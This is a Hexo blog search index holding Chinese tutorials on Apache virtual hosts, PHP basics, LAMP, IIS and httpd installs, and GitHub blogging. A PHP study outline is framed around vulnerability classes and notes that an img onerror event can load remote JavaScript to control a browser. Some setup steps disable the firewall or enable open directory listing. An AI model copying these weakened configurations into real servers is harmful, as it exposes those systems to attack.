我们配置的虚拟主机，是基于域名的虚拟主机，即，一个IP地址，可以绑定多个域名 NameVirtualHost：创建基于域名的虚拟主机的命令。换句话说：就是哪些IP地址可以访问定义的虚拟主机。该命令一般放在Apache的主配置文件中httpd.conf 123如果要配置基于域名的虚拟主机，以下两项必须开启NameVirtualHost *:80Include conf/vhosts.conf 1include用来包含一个文件，也就是说创建虚拟主机的工作就在vhosts.conf这个文件中完成 配置步骤： 配置本地的DNS文件——hosts 文件路径：C:\Windows\System32\drivers\etc\hosts 12我来配置这个域名：127.0.0.1 www.hai.com 配置Apache的主配置文件——httpd.conf 文件路径：..\conf\httpd.conf 监听自己的网卡的哪个IP地址的哪个端口的访问 1Listen 80 以下指定哪些IP地址和端口可以访问虚拟主机，其中，IP地址必须是自己的网卡的IP地址 12NameVirtualHost *:80Include conf/vhosts.conf 配置Apache的虚拟主机——vhosts.conf 文件路径：..\conf\vhosts.conf 123456789101112131415#配置www.hai.com&lt;VirtualHost *:80&gt; #给虚拟主机指定域名(注释只能单起一行) ServerName www.hai.com #指定默认首页，如果不指定，将继承全局配置；如果指定，将覆盖全局配置 DirectoryIndex abc.html #指定网站根目录 DocumentRoot &quot;E:\WWW\web1&quot; #配置目录权限 &lt;Directory &quot;E:\WWW\web1&quot;&gt; Options +Indexes Order Deny,Allow Allow from all &lt;/Directory&gt;&lt;/VirtualHost&gt; 为什么配置完虚拟主机，localhost不能用了 1配置完虚拟主机后，第一个虚拟主机的优先级最高，比全局中的配置还要高。因此，访问localhost时，就指向了第一个虚拟主机 123456所以，要配置localhost的虚拟主机，并放在第一个#配置localhost&lt;VirtualHost *:80&gt; ServerName localhost DocumentRoot &quot;E:\WWW&quot;&lt;/VirtualHost&gt;]]></content>
      <tags>
        <tag>apache,配置,虚拟主机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php(以漏洞层面出发)]]></title>
    <url>%2F2018%2F12%2F13%2FPHP%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93(%E4%BB%A5%E6%BC%8F%E6%B4%9E%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)%2F</url>
    <content type="text"><![CDATA[HTML + CSS常用标签12345678910111213141516&lt;a href=&apos;&apos;&gt;&lt;/a&gt;&lt;img src=&apos;&apos;&gt;&lt;from action=&apos;&apos; method=&apos;&apos;&gt; &lt;input type=&apos;&apos; name=&apos;&apos; value=&apos;&apos;&gt;&lt;/from&gt;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; a img form三个标签必须掌握，了解href,src。针对于form标签，了解action,method,type,name,value. 特别是了解input中的name在PHP中的使用。 JavaScript工具 熟练使用开发者工具 元素审查 控制台 代码 页面中加载js代码的方式（script标签直接写，使用事件调用，script使用src加载） 学会在js中定义变量 在js中使用数组 在js中调用函数 在整个html页面中，所有加载的代码，是一个整体。事件中、标签中、src文件中的代码是一个整体，可以在这三个位置使用其他位置的变量函数等。 事件 常用的事件 事件中可以直接执行代码 事件可以调用函数 利用错误的img或其他的标签，调用onerror事件，然后加载远程的js文件，控制浏览器（在之后的xss漏洞中会用到，可以先行了解）。 DOM js使用dom获取一个标签元素 js使用dom修改一个标签元素 js使用dom添加一个标签元素（学会发送get/post请求） Window location中几个url参数 document.cookie（自行了解） PHP别忘了之前学的搭建lamp环境以及wamp环境PHP适合html结合在一起使用的。 使用PHP动态的生成html页面 PHP标签的使用以及嵌入 PHP文件的后缀意义（很重要，在之后学习上传漏洞时会用到） apache默认只解析.php，.phtml文件后缀，可在Apache的配置文件httpd.conf中搜索addtype进行更改 基础语法 代码规范 变量以及常量 数据类型 输入（重点了解 $_GET $_POST $_SERVER $_REQUEST） 输出（echo var_dump） 各种运算符 数组（类型，数组操作添加输出元素，foreach输出元素） 字符串常用函数（count,strlen,str_split,chr,md5,htmlentities,addslashes,trim,strcmp） 条件控制（if(){}else{}, switch(){case:break;}） 循环控制（for,foreach,while,do while） 函数（创建,传参，获取结果） 对象（能够看懂，可以自行深究） 表单操作 $_GET $_POST $_SERVER $_REQUEST 文件操作（漏洞任意文件读取） fopen打开文件 fwrite写文件 unlink删除文件 读写模式 file_get_contents file_put_content 可以使用PHP伪协议进行读文件（附加）以及任意文件读取（目录跳跃） 命令执行以及代码执行（漏洞代码命令执行） system eval 文件包含（漏洞任意文件包含） include require 文件上传（漏洞文件上传） $_FILES 获取文件内容 获取文件信息 处理上传的文件 Cookie和Session（漏洞cookie伪造） setcookie _COOKIE session_start $_SESSION session_destroy 数据库操作（漏洞注入）Mysql + PHP]]></content>
      <tags>
        <tag>php,漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php(以代码层面出发)]]></title>
    <url>%2F2018%2F12%2F13%2Fphp(%E4%BB%A5%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)%2F</url>
    <content type="text"><![CDATA[语言基础 php文件的后缀名：.php php区分大小写，关键字和函数名不区分大小写 php所有代码不会在前端显示 注释： 单行注释：//或# 多行注释：/* 注释内容 */ 变量 变量： 可以包含字母，数字，下划线 以$开始 不能以数字开头 {}：可以包住变量，如{$a}，用途：可在变量后紧跟其他内容，无需空格 赋值传值和引用传值 赋值传值： $a = 1; ​ $b = $a; ​ $a = 2; 重新给$a赋值 ​ echo $b; $b的值不变，还是1 引用传值： $a = 1; ​ $b = &amp;$a; ​ $a = 2; ​ echo $b; 结果为2 数据类型 数据类型： 标量数据类型：整形int，浮点型float，布尔型bool，字符型string 布尔型bool(false)有哪些：false ，整形0， 浮点型0.0， 空字符串“”， 字符串“0”， 空数组， null，其余全是bool(true) 整形int：可以用十进制、八进制(0开头)、十六进制(0x开头)进行赋值 字符型string：在单引号&#39;&#39;里变量不会被解析 复合数据类型：数组array，对象object 特殊数据类型：资源resource，空null null：这些情况被认为null：被赋值为null， 尚未赋值 ，被unset() 判断数据类型 var_dump() 在UTF-8编码下，一个汉字用3个字节表示；在GBK下，一个汉字用2个字节表示 通过is函数判断数据类型 is_bool()，is_float()，is_int()，is_numeric()等等 EOF：处理长字符串 以&lt;&lt;&lt;EOF开始，EOF结束 “EOF”可以自定义名称，叫什么都可以 EOF表示字符串的结束，必须放在行首，不能缩进，单独一行 在EOF中，特殊字符不需要转义 反斜杠\：用来转义被程序语法结构占用了的特殊字符 检查变量是否设置 isset()函数 empty()函数 强制数据类型转换：在变量前加上英文小括号并写入要转换的数据类型，如：(bool)$a，(int)$a 其它类型转成字符串，有以下规则： 布尔值true转为字符串1，false转为字符串&quot;&quot;（空字符串） 整数或浮点数转换成数值型的字符串 数组将被转换成字符串&quot;array&quot; null将被转换成空字符串 其它类型转成整形或浮点型，有以下规则： 布尔值false转成0，true转成1 浮点数转成整形，数字被取整（小数位被丢弃） 如果字符串以合法的数字开头，这个数字可直接转成数值；否则，被转成0 常量 常量 不要在常量前加美元符号$ 定义：define(name,value[,flag]) name：变量名 value：变量值 flag：可选项，规定常量名是否对大小写敏感。true敏感，false不敏感 系统常量 __FILE__：PHP程序文件名 __LINE__：PHP程序当前行号 PHP_VERSION：PHP程序版本号 PHP_OS：操作系统名称 TRUE：真值 FALSE：假值 NULL：一个null值 E_ERROR：这个常量指到最近的错误处 E_WARNING：这个常量指到最近的警告处 E_PARSE：这个常量指到解析语法有潜在问题处 E_NOTICE：这个常量为发生不寻常但不一定是错误处 运算符算数运算符，逻辑运算符，比较运算符，赋值运算符，字符串运算符，条件运算符 算术运算符：+，-，*，/，%，++，-- 字符串运算符：.，.= 赋值运算符：=，-=，+=，*=，/=，%= 比较运算符：&gt;，&lt;，&gt;=，&lt;=，==，===，!=，!==，&lt;&gt; 逻辑运算符：and(&amp;&amp;)，or(||)，not(!) 条件运算符：?: 流程控制 if条件判断 if(){} if(){}else{} if(){}elseif(){}else… while循环：先判断，后循环 ​ $i = 0; ​ while($i&lt;100){ ​ echo $i; ​ } do while循环：先循环一次，在进行判断 ​ $i = 0; ​ do{ ​ echo $i; ​ }while($i&gt;100) switch分支语句：通过一个条件来选择要执行的代码 ​ switch(参数或表达式){ ​ case 值1: ​ code1; ​ break; ​ default: ​ code; ​ break; ​ } for循环 for(初始化;条件判断;条件更新){ ​ 循环体语句块; } break语句：无条件结束循环，使程序跳转到大括号之后，break可接受参数来决定跳出几层循环，默认只跳出当前循环 continue语句：结束本次循环，也可接受一个参数，来决定跳出几重循环 数组 分类 索引数组：下标为整数的数组 关联数组：下标为字符串的数组 多维数组：数组的一个或多个元素是数组 创建数组 使用数组标识符[]来创建数组： 语法：$arr[key] = value; 使用array函数来创建： 语法：$arr = array([key=&gt;]value,…); unset()函数：删除数组元素 只删除元素，但保留其结构 解析： $arr = [1,2,3,4,5]; ​ foreach($arr as $i=&gt;$value){unset($arr[$i]);} ​ $arr[] = 100; 此时，值为100的键名为5 foreach()函数：（只能）遍历数组 语法：1. foreach($arr as $value){`code;`} 2. foreach($arr as $key =&gt; $value){`code;`} 其他一些数组操作函数：count()，array_shift，array_pop()，array_reverse，array_flip()…… PHP全局数组 $_SERVER $_SERVER[‘SERVER_ADDR’]：服务器IP地址 $_SERVER[‘REMOTE-ADDR’]：客户端IP地址 $_SERVER[‘SERVER_NAME’]：服务器域名称 $_GET $_POST $_FILES $_REQUEST $_SESSION 函数 必须由function关键字开头来定义一个函数 函数名的命名规则和变量一样，函数名不能以$开头 函数名后紧跟括号()，()中包含参数，参数是函数将从调用者处获得的值，参数可有可无，数量根据需要而定 函数代码块在定义时不会执行，只有在被调用时才执行 可以使用return返回值 参数： 值传递：正常的写法 引用传递：在参数前加上&amp; 解析： $arr = array(1,2,3,4); ​ function addElement(&amp;$arr){ ​ $arr[count($arr)] = 100; ​ print_r($arr); //在函数内输出$arr ​ } ​ addElement($arr); ​ print_r($arr); //在函数外输出$arr 默认值传递：传递一个默认的值，在调用是可以根据情况指定或不指定 解析： function func1($who,$animal = ‘猪’){ ​ echo “$who 是 $animal”; ​ } ​ func1(‘老鹰’，‘鸟’)； ​ func1(‘你’)； 过于真实，举报了！ 函数变量的作用域：在PHP中，函数外部与内部的变量不能通用，必须在声明变量时加上global关键字才可以 global关键字只能在函数内使用 不能在声明变量的同时赋值 内置函数 include：如果指定文件有错，则报警告并继续执行 require：如果指定文件有错，则报致命错误并终止运行 PHP内置了各种函数，比如： 日期和时间函数 数学函数 HTTP函数 URL函数 字符串操作函数 等等…… 对象]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rpm安装php]]></title>
    <url>%2F2018%2F12%2F07%2Frpm%E5%AE%89%E8%A3%85php%2F</url>
    <content type="text"><![CDATA[本文可能有点乱，右边有个目录，看着那个来就行了 本文讲述linux（centos7）使用rpm安装php的过程rpm安装软件的命令是这样的：rpm -ivh 软件名 -i –install,安装 -v –verbose,详细过程 -h –hash,显示进度信息 过程中会遇到依赖包的问题，一个一个解决掉就完事儿了！ 开始安装解压php.rat.gz进入packages目录中，有5个文件，都是安装包，这篇文章主线就是安装这五个包，随便执行一个瞅瞅 安装httpd…这个错误中说明安装此程序需要四个依赖，不过其中有一个依赖（http-tools...）在我解压php.tar.gz的时候里面有，所以，可以先安装那个试一试 ①安装httpd-tools…缺少这两个依赖包，去镜像站下载，我这里用的华为的镜像站，下载好，传到虚拟机里面来，如下： 安装apr…成功！ 安装apr-util…：成功！ 注：如果安装这两个顺序反了，可能会出错，不过也没啥，可能错误就是apr-util被apr依赖，那你先安装apr就ojbk了 继续安装httpd-tools…成功！ ②安装httpd…这里有个坑！在镜像站里面是找不到/etc/mime.types这个货的，像这种错误信息里给出的名字和安装包的名字不一样的恶心情况，有两种解决办法： 使用yum安装httpd，然后查看安装过程，找到/etc/mime.types，看紧跟着它下面要安装的包的名字，就是我们要找的玩意儿 Google一下，你全知道所以我是Google出来看到别的大佬用的第一种方法找到然后分享的，然后我就直接去镜像站找了这个货，传进虚拟机，装它 安装mailcap…成功！！ 继续安装httpd…成功！ 安装php…这里说明一点，这三个包是相互依赖的关系，不管你先装哪个，最后出错了，还是要按照这个顺序来，所以我就直接按照这个正确的顺序来装了： ③安装php-common…缺少这个玩意儿，去镜像站下载，传过来，装它： 安装libzip…成功！ 继续安装php-common…成功！ ④安装php-cli…这里！这里！是最恶心的一个地方！首先，找不到libcrypto这个玩意儿，然后发现这个是openssl的扩展还是依赖，就是最后发现是因为openssl的版本过低，然后去更新版本，如果通过rpm来装，好像有三十多个依赖包，我崩溃了。所以我选择用yum来装，yum大法好！！ yum安装openssl成功！ 继续安装php-cli…成功！ ⑤安装php…大功告成！！！！！！ 查看是否安装成功查看PHP版本即可： 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>rpm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows搭建IIS]]></title>
    <url>%2F2018%2F12%2F06%2Fwindows%E6%90%AD%E5%BB%BAiis%2F</url>
    <content type="text"><![CDATA[本次使用的虚拟机是Windows Server 2008 R2，我要在上面搭建iis服务，并运行一个asp的网站。 前提：需要以下两个文件： .net framework 4.7.2 一个asp的网站源码 操作步骤如下： 安装IIS之后再次点击下一步好无聊，iis装完了！照我这样选，基本的东西都有！ 配置IIS 删除默认网站和应用池 添加网站然后导入网站数据 改权限 改权限是为了能对网站进行各种操作 启用父路径False改为True 更改默认首页这里去看下载的网站的源码，默认首页是什么格式的这里就怎么写 启用32位程序 选择.net 4版本由于我事前并没有安装，所以无法修改，所以这里没有截图，操作步骤同上，在选择高级设置的时候，这回选择基本设置，就可以在里面修改了。 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>windows,iis,搭建,asp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习总结]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[2018/12/03 周一搭建博客系统，链接到我的博客文章： 搭建GitHub博客里面讲到了hexo使用与安装，github使用，git使用，更改主题以及如何上传博客文章 2018/12/04 周二上午：linux命令拓展 Linux命令拓展（待定） 下午：linux(centos)中安装软件的三种方法： yum安装 rpm安装 源码安装里面讲到了ssh连接，虚拟机与真实机之间拖拽文件，源码怎么安装软件，错误解决办法在源码安装中并不是全都是用源码安装的，所以之后延伸到这篇博客：纯源码安装httpd（待定） 2018/12/05 周三LAMP环境搭建与应用 安装Apache服务，遇到防火墙拦截问题，添加防火墙规则 2018/12/06 周四上午 windows server 2008 + asp网站搭建 + access数据库 下午 windows server 2008 + asp网站搭建 + sql server 2008 无法复现 2018/12/07 周五html+css更新了一篇博客：rpm安装php]]></content>
      <tags>
        <tag>笔记,总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP环境搭建与配置]]></title>
    <url>%2F2018%2F12%2F05%2FLAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[说明本次搭建用的是centos6的虚拟机，是大佬直接传给我的虚拟机，所有就存在了一个问题，克隆的虚拟机会出现网卡找不到的情况解决方法就是: 执行命令： cat /etc/udev/rules.d/70-persistent-net.rules 查看里面最下面的网卡名称和MAC地址 然后打开网卡配置信息并修改 vi /etc/sysconfig/network-scripts/ifcfg-eth0 然后重启网卡就可以了，执行命令： service network restart 现在我们开始安装LAMP！ 搭建LAMPLAMP=LINUX+APACHE+MYSQL+PHP 这是在Linux下最常见的提供web服务的组合之一 Linux 是免费开源软件，这意味着源代码可用的操作系统 Apache 是使用中最受欢迎的一个开放源码的WEB服务器软件 MySQL 是多线程、多用户的SQL数据库管理系统 PHP 是一种编程语言最初设计生产动态网站。PHP 是主要用于服务器端的应用程序软件 接下来我们开始安装，为了方便，我们直接使用yum来安装 安装Apache 执行命令： yum install httpd httpd-devel httpd-manual mod_ssl mod_perl mod_auth_mysql 装完之后，在启动前，需要解决一个错误：首先验证你有没有这个错误，直接执行命令httpd看是否和上面错误一样，如果一样，那我们就来解决它 我们先停止httpd服务，执行命令service httpd stop,打开httpd.conf配置文件，修改ServcerName，使域名生效，所以我们来执行命令： vi /etc/httpd/conf/httpd.conf /exam :为了更快速的找到servername 把#去掉，完事儿 启动httpd： service httpd start 这个时候去使用ip访问时访问不了的，因为防火墙有拦截，防火墙这么做，是为了防止网站受到攻击，之前我们直接关闭了防火墙去做访问，但是这样很不安全，所以我们就需要修改防火墙的规则来在防火墙开启的状态下又能正常访问 修改防火墙规则在centos6中，防火墙规则是放在一个文件中的，centos7中是通过命令修改的，这是不一样的地方打开防火墙规则文件，修改就完事儿了 vi /etc/sysconfig/iptables 在里面我们需要加入一条规则： -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT 这里要说明两点： 这条命令要加在这条命令：之前，因为这条命令拒绝所有数据包访问，而防火墙规则是从上到下执行的，我们需要写在这条命令前面才能生效 解释一下这条命令：-A：追加规则，-INPUT：别人请求你，-p：指定协议类型，-m：启用扩展功能，--dport：-p的扩展，指定端口，-j：指定这条规则如何进行处理，ACCEPT表示通过 之后重启防火墙即可 service iptables restart 成功访问：设置开机自启： chkconfig httpd on 安装MySQL 执行命令： yum install mysql mysql-server mysql-devel 至此MySQL就安装完成 启动MySQL service mysqld start 初始化MySQL mysql_secure_installation 在这里需要设置MySQL数据库密码：之后一路回车就完事儿了设置开机自启： chkconfig mysqld on 至此MySQL就安装完成了！ 安装PHPyum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php安装完成由于PHP是Apache的扩展，所以安装完PHP后需要重启Apache服务： service httpd restart 至此，LAMP环境安装完成 搭建网站 我们来导入网站源码测试一下，这次我们搭建一个漏洞环境，通过小黄鸭将文件导入/var/www/html目录中： 修改文件夹权限，避免出现权限问题： chown -R apache:aoache /var/www/html 打开配置文件 vi /var/www/html/sys/config.php 修改账户密码为自己数据库的账户密码，保存退出即可 浏览器访问一下，出现如下错误：这是因为我们数据库中没有vauditdemo这个数据库，进入mysql创建一个就可以了： 浏览器再次访问：成功访问！ 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>lamp,搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[源码安装httpd]]></title>
    <url>%2F2018%2F12%2F04%2F%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85httpd%2F</url>
    <content type="text"><![CDATA[本文介绍了如何在linux（centos7）中通过httpd的源代码安装httpd服务 ssh连接虚拟机 注：为什么要用ssh操作虚拟机，优点如下： 界面美观 可以进行复制粘贴操作 安全 … 我使用的软件为：Termius界面如图所示：点击右下角NEW HOST，弹出如下界面： label： 起个别名 address： 在虚拟机里面输入命令ifconfig查看自己的ip地址 username： 用户名 password： 密码 点击save保存，之后双击即可连接如果双击后有提示框弹出，点击确定即可 把httpd文件拷贝进centos7中在Apache官网下载好源码后，使用这个软件进行真实机与虚拟机之间的文件拷贝打开软件，点击左上角新建连接，填好内容后点击连接即可点击允许之后看到的内容和在虚拟机之中使用ls命令看到的内容是一样的把要安装的httpd的压缩文件直接拖入小黄鸭中，等待完成即可 开始在Termius中远程安装在开始之前，需要进行一个很重要的操作，安装开发者工具集： yum groupinstall &quot;development tools&quot; 安装这个工具集的目的是为了能执行一些编译之类的命令，博主现在还不太懂装完之后长这个样子：之后开始安装：解压： tar zxvf httpd-2.4.37.tar.gz 进入到解压后的目录中，有一个INSTALL文件，通过小黄鸭（cyberduck）传到真实机上面通过编辑器打开：红框中的内容为安装所需操作步骤，后面大写的PERFIX为路径，写上你想安装的路径即可 执行第一个命令./configure --prefix=/usr/local/apache2 /usr/local/apache2为路径，自己想装在哪儿装哪儿就完事儿了出错：APR未找到，那么我们来找一下 yum search apr 把里面所有文件装上即可，执行命令： yum install apr-devel apr-util-devel apr-util apr -y 解释：通过yum install同时安装四个文件，文件不需要写全后缀，linux会自动补全，把所有类型的前缀都安装上，一共就这四种，最后的-y参数是在遇到让你输入y/n的时候自动输入y解决掉错误，继续执行第一个命令： ./configure --prefix=/usr/local/apache2 再次出错：找一下pcre： yum search pcre 同上，执行命令： yum install pcre-devel pcre2-devel pcre pcre2 -y 又解决一个错误，继续执行第一个命令： ./configure --prefix=/usr/local/apache2 执行第二条命令make 输入后它会执行好多内容，等待一会儿即可 执行第三条命令make install 输入完执行，然后等待即可到这里httpd就安装完成了 执行第四条命令/usr/local/apache2/bin/apachectl start 解释：这条命令的作用是开启httpd服务出现这个错误无关紧要，不用管：OK，成功开启 访问首先需要关闭防火墙才能在局域网其他主机访问： systemctl stop firewalld 之后在浏览器中输入ip地址:80即可访问 放入站点文件把我的博客源码放入apache安装目录下的htdocs文件夹中，通过小黄鸭（cyberduck）直接进行拖拽即可 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>源码安装,httpd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建GitHub博客]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[注：本文操作系统环境为windows 安装前提Nodejs : 官网下载就完事儿了，默认安装Git : 官网下载，安装的时候勾选上可以在cmd中运行即可 文本解释器Visual Studio Code(推荐)或者Sublime Text 安装hexowin+R打开输入cmd，执行命令: npm install -g hexo-cli 目的：安装hexo 新建文件夹存储此项目我的文件夹命名为myblog，在文件夹内打开cmd窗口，执行命令： hexo init . 目的：初始化 修改配置文件把myblog文件夹用visual studio code打开，打开_config.yml配置文件修改红框中的内容，注意：属性与值之间有空格，例： language: ZH-CN url后续再做更改 GitHub创建并登录GitHub，之后点击右上角+号，新建一个存储库New repository之后点击Create repository就完事儿了初始界面大致长这个样子：选择create new file新建一个文件 下载静态文件并且完成本地访问由于在github中直接新建文件存在各种局限性，所以通过本地写会更方便一些在myblog文件夹中打开cmd命令行窗口，执行命令： hexo generate 目的：更新静态文件，hexo程序直接帮你写好初始化静态网页本地访问： 本地访问可以方便的看到文件在浏览器中的具体样子，便于修改 同步本地文件至github打开github desktop并登录选择clone a repository选择存储库，设置本地路径，点击clone把写好的文件放入上一步设置的路径中,打开github desktop选择要上传的文件，点击commit to master进行上传同步： 主题更改找主题：themes下载主题： 1. 复制文件路径： 在myblog/themes文件夹中打开cmd窗口,执行命令： git clone 主题路径 在myblog文件夹中用编辑器打开_config.yml，修改theme值为你的主题名 清空旧网站文件，生成新网站文件在myblog文件中打开cmd命令行窗口，执行命令： hexo clean 目的：清除旧网站文件（public文件夹） hexo generate 目的：生成新网站文件（public文件夹）如果想在本地访问，可执行命令： hexo server 目的：开启本地服务器然后在浏览器地址栏输入localhost:4000即可 上传主题在github存储库的文件夹中删除所有文件（.gt隐藏文件不要删），把myblog文件夹中的public文件夹中的所有内容复制到github存储库文件夹中在github desktop中添加摘要和描述，点击commit to master即可同步： 如何在博客里面写文章在myblog文件夹中打开cmd命令行窗口，执行命令： hexo new &quot;filename&quot; 屏幕会输出文件保存路径在myblog文件夹中打开vscode，打开上述图片位置，写入内容，保存即可更新网站文件：在myblog文件夹中打开cmd，执行命令： hexo generate 目的：更新本地public文件夹把myblog/public文件夹中的内容复制到github存储库的本地文件夹中，通过github desktop上传并同步即可 错误说明原因：github desktop的本地存储库文件夹中的.gt隐藏文件不能删除 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>GitHub,博客,搭建</tag>
      </tags>
  </entry>
</search>
